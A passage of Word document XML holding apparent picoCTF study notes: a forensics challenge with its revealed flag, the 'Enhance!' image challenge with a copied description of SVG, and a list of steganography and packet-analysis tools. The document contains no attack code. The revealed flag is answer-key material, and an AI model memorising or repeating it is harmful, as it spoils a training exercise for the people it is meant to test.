          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>e can click right arrow button at the bottom to change the different color.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213DA985" w14:textId="3338D5D2" w:rsidR="00527C9A" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="266FBAD9" wp14:editId="6AD4F972">
            <wp:extent cx="6332220" cy="256730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83"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2567305"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="78AE8C2F" w14:textId="3E738AC1" w:rsidR="002D6730" w:rsidRDefault="00527C9A" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00527C9A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{w1z4rdry}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719EE8EC" w14:textId="785AABA1" w:rsidR="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00E43273">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B812370" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Enhance!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44394A51" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E4DBF7" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD78B11" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79FEDA12" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4100EF02" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BDDECFA" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BD91712" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Download this image file and find the flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02570F18" w14:textId="77777777" w:rsidR="00F8797D" w:rsidRPr="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="00F8797D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4977301B" w14:textId="0A5728BA" w:rsidR="00F8797D" w:rsidRDefault="00F8797D" w:rsidP="005E3D8A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F8797D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Download image file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BA1F80" w14:textId="4CC21607" w:rsidR="005E3D8A" w:rsidRDefault="005E3D8A" w:rsidP="005E3D8A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F8AF8E1" w14:textId="4C7A4863" w:rsidR="005E3D8A" w:rsidRDefault="005E3D8A" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="24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Scalable Vector Graphics</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SVG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) is an </w:t>
      </w:r>
      <w:hyperlink r:id="rId184" w:tooltip="XML" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="0645AD"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>XML</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>-based </w:t>
      </w:r>
      <w:hyperlink r:id="rId185" w:tooltip="Vector image format" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="0645AD"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>vector image format</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> for defining </w:t>
      </w:r>
      <w:hyperlink r:id="rId186" w:tooltip="Two-dimensional" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="0645AD"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>two-dimensional</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> graphics, having support for interactivity and animation.</w:t>
      </w:r>
      <w:r w:rsidRPr="005E3D8A">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SVG images are defined in a </w:t>
      </w:r>
      <w:hyperlink r:id="rId187" w:tooltip="Vector graphics" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="0645AD"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>vector graphics</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> format and stored in </w:t>
      </w:r>
      <w:hyperlink r:id="rId188" w:tooltip="XML" w:history="1">
        <w:r w:rsidRPr="005E3D8A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="0645AD"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:highlight w:val="yellow"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>XML</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E3D8A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> text files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41311651" w14:textId="594A82E5"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August 31, 2022 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8C7A76" w14:textId="0637E754"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Tools</w:t>
      </w:r>
      <w:r w:rsidR="003B387F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B23418" w14:textId="069FBE70" w:rsidR="003B387F" w:rsidRDefault="00524C4E" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId189" w:history="1">
        <w:r w:rsidRPr="00F14FBF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>https://github.com/zardus/ctf-tools</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="467D1711" w14:textId="6AF775F9" w:rsidR="00524C4E" w:rsidRDefault="00524C4E" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId190" w:history="1">
        <w:r w:rsidRPr="00524C4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>https://kb.offsec.nl/tools/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3275BBDB" w14:textId="654B9DD9" w:rsidR="00524C4E" w:rsidRDefault="00524C4E" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20F3875E" wp14:editId="723F14C6">
            <wp:extent cx="6332220" cy="302768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191"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3027680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="02251F13" w14:textId="22E3F5AF" w:rsidR="00644B84" w:rsidRDefault="00644B84" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>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Tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E55128B" w14:textId="3FDD3C3D" w:rsidR="00644B84" w:rsidRDefault="00644B84" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>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Steghide</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003B387F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">    embed file into image file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BED3730" w14:textId="4DD4F221"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Stegsolve.jar</w:t>
      </w:r>
      <w:r w:rsidR="003B387F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D59ABA2" w14:textId="5D49C91E" w:rsidR="003B387F" w:rsidRDefault="003B387F" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId192" w:history="1">
        <w:r w:rsidRPr="003B387F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>Usage of stegsolve.jar</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="59FBD26E" w14:textId="0BC05FCF" w:rsidR="00644B84" w:rsidRDefault="00644B84"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Hex editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E284689" w14:textId="2F397AF9" w:rsidR="00644B84" w:rsidRDefault="003B387F" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01218316" w14:textId="77777777" w:rsidR="003B387F" w:rsidRPr="00644B84" w:rsidRDefault="003B387F" w:rsidP="00644B84">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="202122"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="003B387F" w:rsidRPr="00644B84">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roman"/>
    <w:pitch w:val="variable"/>
  </w:font>
  <w:font w:name="Liberation Serif">
    <w:altName w:val="Times New Roman"/>
    <w:charset w:val="01"/>
    <w:family w:val="roman"/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="DengXian">
    <w:altName w:val="等线"/>
    <w:panose1 w:val="02010600030101010101"/>
    <w:charset w:val="86"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="A00002BF" w:usb1="38CF7CFA" w:usb2="00000016" w:usb3="00000000" w:csb0="0004000F" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="Lohit Devanagari">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>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default"/>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charset w:val="86"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="30000003" w:usb1="2BDF3C10" w:usb2="00000016" w:usb3="00000000" w:csb0="602E0107"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5CD7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D24ADE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21F442C3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D59EB90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269B4BB2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5C861CE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6A1839"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="541882A6"/>
    <w:lvl w:ilvl="0" w:tplc="6B94A4F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47B07C2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B144E8F0"/>
    <w:lvl w:ilvl="0" w:tplc="E56E4BE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DA659CF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="76B0CB1A"/>
    <w:lvl w:ilvl="0" w:tplc="4C2CC1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DAD4690"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="833C1C4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72805ECE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E9CE148A"/>
    <w:lvl w:ilvl="0" w:tplc="B150D5B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7183062">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="948776446">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="2093237098">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1930891072">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1566838847">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1622108034">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="779646922">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="4240401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591"/>
    <w:rsid w:val="00003460"/>
    <w:rsid w:val="0003115B"/>
    <w:rsid w:val="00074237"/>
    <w:rsid w:val="000A0346"/>
    <w:rsid w:val="000A6F2E"/>
    <w:rsid w:val="000B5615"/>
    <w:rsid w:val="000D65A8"/>
    <w:rsid w:val="000F4EF3"/>
    <w:rsid w:val="000F619C"/>
    <w:rsid w:val="000F6870"/>
    <w:rsid w:val="00112261"/>
    <w:rsid w:val="001215E4"/>
    <w:rsid w:val="0014279A"/>
    <w:rsid w:val="0018076A"/>
    <w:rsid w:val="00193B90"/>
    <w:rsid w:val="001B4D67"/>
    <w:rsid w:val="001C530B"/>
    <w:rsid w:val="001F49D5"/>
    <w:rsid w:val="001F4DD4"/>
    <w:rsid w:val="00222A2A"/>
    <w:rsid w:val="00233019"/>
    <w:rsid w:val="002401ED"/>
    <w:rsid w:val="00242C83"/>
    <w:rsid w:val="00244A25"/>
    <w:rsid w:val="0026246E"/>
    <w:rsid w:val="00264306"/>
    <w:rsid w:val="00274155"/>
    <w:rsid w:val="002A12D6"/>
    <w:rsid w:val="002C0966"/>
    <w:rsid w:val="002D0E90"/>
    <w:rsid w:val="002D6730"/>
    <w:rsid w:val="002E7CDC"/>
    <w:rsid w:val="00311F0B"/>
    <w:rsid w:val="00313A37"/>
    <w:rsid w:val="003B387F"/>
    <w:rsid w:val="003C0B9B"/>
    <w:rsid w:val="003E7B32"/>
    <w:rsid w:val="003F18E9"/>
    <w:rsid w:val="00410849"/>
    <w:rsid w:val="0044030E"/>
    <w:rsid w:val="004624E7"/>
    <w:rsid w:val="00484771"/>
    <w:rsid w:val="004A6D37"/>
    <w:rsid w:val="004C0F07"/>
    <w:rsid w:val="004C3213"/>
    <w:rsid w:val="005047B5"/>
    <w:rsid w:val="00517A56"/>
    <w:rsid w:val="00524C4E"/>
    <w:rsid w:val="00527C9A"/>
    <w:rsid w:val="00582B93"/>
    <w:rsid w:val="00583AE0"/>
    <w:rsid w:val="00590591"/>
    <w:rsid w:val="00597B12"/>
    <w:rsid w:val="005C5F86"/>
    <w:rsid w:val="005E210F"/>
    <w:rsid w:val="005E3D8A"/>
    <w:rsid w:val="005F588A"/>
    <w:rsid w:val="00604D66"/>
    <w:rsid w:val="006348ED"/>
    <w:rsid w:val="00644B84"/>
    <w:rsid w:val="0064739B"/>
    <w:rsid w:val="00654264"/>
    <w:rsid w:val="00697F3A"/>
    <w:rsid w:val="006B199A"/>
    <w:rsid w:val="006B4BC9"/>
    <w:rsid w:val="006F0F0E"/>
    <w:rsid w:val="006F3074"/>
    <w:rsid w:val="00702A7D"/>
    <w:rsid w:val="00721F7B"/>
    <w:rsid w:val="00734CC9"/>
    <w:rsid w:val="00740B7E"/>
    <w:rsid w:val="00760362"/>
    <w:rsid w:val="0076788A"/>
    <w:rsid w:val="00773038"/>
    <w:rsid w:val="00786656"/>
    <w:rsid w:val="00792834"/>
    <w:rsid w:val="00794AA0"/>
    <w:rsid w:val="007C33FA"/>
    <w:rsid w:val="007C7A2D"/>
    <w:rsid w:val="007D5169"/>
    <w:rsid w:val="007F41A8"/>
    <w:rsid w:val="00866357"/>
    <w:rsid w:val="00886D6D"/>
    <w:rsid w:val="008B4ABA"/>
    <w:rsid w:val="00903761"/>
    <w:rsid w:val="00930F85"/>
    <w:rsid w:val="0096174C"/>
    <w:rsid w:val="00961C9B"/>
    <w:rsid w:val="00974072"/>
    <w:rsid w:val="00982888"/>
    <w:rsid w:val="00984685"/>
    <w:rsid w:val="00991466"/>
    <w:rsid w:val="00997DDB"/>
    <w:rsid w:val="009A269F"/>
    <w:rsid w:val="009B18D6"/>
    <w:rsid w:val="009B328F"/>
    <w:rsid w:val="00A15E3A"/>
    <w:rsid w:val="00A226E0"/>
    <w:rsid w:val="00A35726"/>
    <w:rsid w:val="00A5684E"/>
    <w:rsid w:val="00AA1035"/>
    <w:rsid w:val="00AC1BAC"/>
    <w:rsid w:val="00B22822"/>
    <w:rsid w:val="00B335C0"/>
    <w:rsid w:val="00B544BA"/>
    <w:rsid w:val="00B6083C"/>
    <w:rsid w:val="00B7152D"/>
    <w:rsid w:val="00BA09F6"/>
    <w:rsid w:val="00BA47DF"/>
    <w:rsid w:val="00BD5D34"/>
    <w:rsid w:val="00BE3C0E"/>
    <w:rsid w:val="00BE6BB7"/>
    <w:rsid w:val="00BE6C96"/>
    <w:rsid w:val="00C0783B"/>
